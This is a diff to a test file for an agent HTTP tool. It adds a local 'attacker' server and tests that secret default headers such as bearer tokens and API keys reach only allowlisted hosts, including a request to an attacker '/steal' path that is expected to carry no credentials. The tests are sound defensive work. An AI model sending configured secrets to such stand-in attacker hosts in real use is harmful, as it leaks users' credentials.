@@ -7,31 +7,36 @@ const callOptions = { toolCallId: "test-call", messages: [] };
 
 let server;
 let baseUrl;
+let attackerServer;
+let attackerUrl;
+
+/** @param {Request} request */
+async function echoRequest(request) {
+  const url = new URL(request.url);
+  const bodyText = await request.text();
+  return Response.json(
+    {
+      method: request.method,
+      pathname: url.pathname,
+      query: Object.fromEntries(url.searchParams.entries()),
+      authorization: request.headers.get("authorization"),
+      apiKey: request.headers.get("x-api-key"),
+      body: bodyText ? JSON.parse(bodyText) : null,
+    },
+    { status: 201, headers: { "x-test-response": "ok" } },
+  );
+}
 
 beforeAll(() => {
-  server = Bun.serve({
-    port: 0,
-    async fetch(request) {
-      const url = new URL(request.url);
-      const bodyText = await request.text();
-      return Response.json(
-        {
-          method: request.method,
-          pathname: url.pathname,
-          query: Object.fromEntries(url.searchParams.entries()),
-          authorization: request.headers.get("authorization"),
-          apiKey: request.headers.get("x-api-key"),
-          body: bodyText ? JSON.parse(bodyText) : null,
-        },
-        { status: 201, headers: { "x-test-response": "ok" } },
-      );
-    },
-  });
+  server = Bun.serve({ port: 0, fetch: echoRequest });
   baseUrl = `http://${server.hostname}:${server.port}`;
+  attackerServer = Bun.serve({ port: 0, fetch: echoRequest });
+  attackerUrl = `http://${attackerServer.hostname}:${attackerServer.port}`;
 });
 
 afterAll(() => {
   server?.stop(true);
+  attackerServer?.stop(true);
 });
 
 describe("createHttpTool", () => {
@@ -71,6 +76,40 @@ describe("createHttpTool", () => {
       },
     });
     expect(result.headers["x-test-response"]).toBe("ok");
+  });
+
+  test("sends configured secret default headers only to allowlisted hosts", async () => {
+    const http = createHttpTool({
+      baseUrl,
+      defaultHeaders: { authorization: "Bearer configured-secret" },
+    });
+
+    const toBase = await http.execute({ url: `${baseUrl}/data` }, callOptions);
+    expect(toBase.body.authorization).toBe("Bearer configured-secret");
+
+    const toAttacker = await http.execute({ url: `${attackerUrl}/steal` }, callOptions);
+    expect(toAttacker.body.authorization).toBeNull();
+  });
+
+  test("allowedHosts pins secret default headers to explicit extra hosts", async () => {
+    const attackerHost = new URL(attackerUrl).host;
+    const http = createHttpTool({
+      baseUrl,
+      allowedHosts: [attackerHost],
+      defaultHeaders: { "x-api-key": "configured-secret" },
+    });
+
+    const toAllowed = await http.execute({ url: `${attackerUrl}/ok` }, callOptions);
+    expect(toAllowed.body.apiKey).toBe("configured-secret");
+  });
+
+  test("without an allowlist default headers keep going everywhere (unchanged)", async () => {
+    const http = createHttpTool({ defaultHeaders: { "x-api-key": "shared" } });
+
+    const toBase = await http.execute({ url: `${baseUrl}/a` }, callOptions);
+    const toAttacker = await http.execute({ url: `${attackerUrl}/b` }, callOptions);
+    expect(toBase.body.apiKey).toBe("shared");
+    expect(toAttacker.body.apiKey).toBe("shared");
   });
 
   test("mounts onto an SDK agent toolset", () => {
